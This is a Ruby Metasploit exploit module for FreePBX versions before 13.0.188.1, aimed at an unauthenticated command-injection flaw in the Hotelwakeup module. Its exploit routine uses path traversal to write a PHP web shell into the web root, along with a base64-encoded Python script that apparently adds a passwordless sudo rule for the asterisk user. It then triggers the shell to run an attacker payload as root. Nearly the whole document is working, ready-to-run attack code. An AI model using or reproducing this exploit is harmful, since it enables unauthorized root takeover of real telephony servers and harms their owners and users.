require 'msf/core'
 
class Metasploit4 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
                      'Name'            => 'FreePBX < 13.0.188.1 Remote root exploit',
                      'Description'     => '
                        This module exploits an unauthenticated remote command execution in FreePBX module Hotelwakeup
                      ',
                      'License'         => MSF_LICENSE,
                      'Author'          =>
                        [
                          'Ahmed sultan (0x4148) <0x4148@gmail.com>', # discovery of vulnerability and msf module
                        ],
                      'References'      =>
                        [
                          "NA"
                        ],
                      'Payload' =>
                        {
                          'Compat' =>
                          {
                            'PayloadType'  => 'cmd',
                            'RequiredCmd'  => 'perl telnet python'
                          }
                        },
                      'Platform'       => %w(linux unix),
                      'Arch'           => ARCH_CMD,
                      'Targets'        => [['Automatic', {}]],
                      'Privileged'     => 'false',
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => 'Sep 27 2016'))
  end
 
  def print_status(msg = '')
    super("#{rhost}:#{rport} - #{msg}")
  end
 
  def print_error(msg = '')
    super("#{rhost}:#{rport} - #{msg}")
  end
 
  def print_good(msg = '')
    super("#{rhost}:#{rport} - #{msg}")
  end
 
  # Application Check
  def check
    res = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'admin', 'ajax.php'),
      'headers' => {
        'Referer' => "http://#{datastore['RHOST']}/jnk0x4148stuff"
      },
      'vars_post' => {
        'module' => 'hotelwakeup',
        'command'       => 'savecall'
      }
    )
 
    unless res
      vprint_error('Connection timed out.')
    end
    if res.body.include? "Referrer"
      vprint_good("Hotelwakeup module detected")
      return Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end
  def exploit
    vprint_status('Sending payload . . .')
    pwn = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'admin', 'ajax.php'),
      'headers' => {
        'Referer' => "http://#{datastore['RHOST']}:#{datastore['RPORT']}/admin/ajax.php?module=hotelwakeup&action=savecall",
        'Accept' => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        'User-agent' => "mostahter ;)"
      },
      'vars_post' => {
        'module' => 'hotelwakeup',
        'command'       => 'savecall',
        'day'       => 'now',
        'time'       => '+1 week',
        'destination'       => '/../../../../../../var/www/html/0x4148.php',
        'language'       => '<?php echo "0x4148@r1z";if($_GET[\'r1zcmd\']!=\'\'){system("sudo ".$_GET[\'r1zcmd\']);}else{fwrite(fopen("0x4148.py","w+"),base64_decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCmltcG9ydCBvcwppbXBvcnQgdGltZQojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLSAKY21kID0gJ3NlZCAtaSBcJ3MvQ29tIEluYy4vQ29tIEluYy5cXG5lY2hvICJhc3RlcmlzayBBTEw9XChBTExcKVwgICcgXAoJJ05PUEFTU1dEXDpBTEwiXD5cPlwvZXRjXC9zdWRvZXJzL2dcJyAvdmFyL2xpYi8nIFwKCSdhc3Rlcmlzay9iaW4vZnJlZXBieF9lbmdpbmUnCm9zLnN5c3RlbShjbWQpCm9zLnN5c3RlbSgnZWNobyBhID4gL3Zhci9zcG9vbC9hc3Rlcmlzay9zeXNhZG1pbi9hbXBvcnRhbF9yZXN0YXJ0JykKdGltZS5zbGVlcCgyMCk="));system("python 0x4148.py");}?>',
      }
    )
    #vprint_status("#{pwn}")
    vprint_status('Trying to execute payload <taking around 20 seconds in case of success>')
    escalate = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, '0x4148.php.call'),
      'vars_get' => {
        '0x4148' => "r1z"
      }
    )
    if escalate.body.include? "0x4148@r1z"
        vprint_good("Payload executed")
        vprint_status("Spawning root shell")
        killit = send_request_cgi(
          'method' => 'GET',
          'uri'    => normalize_uri(target_uri.path, '0x4148.php.call'),
          'vars_get' => {
            'r1zcmd' => "#{payload.encoded}"
          }
        )       
    else
        vprint_error("Exploitation Failed")
    end
    end
end
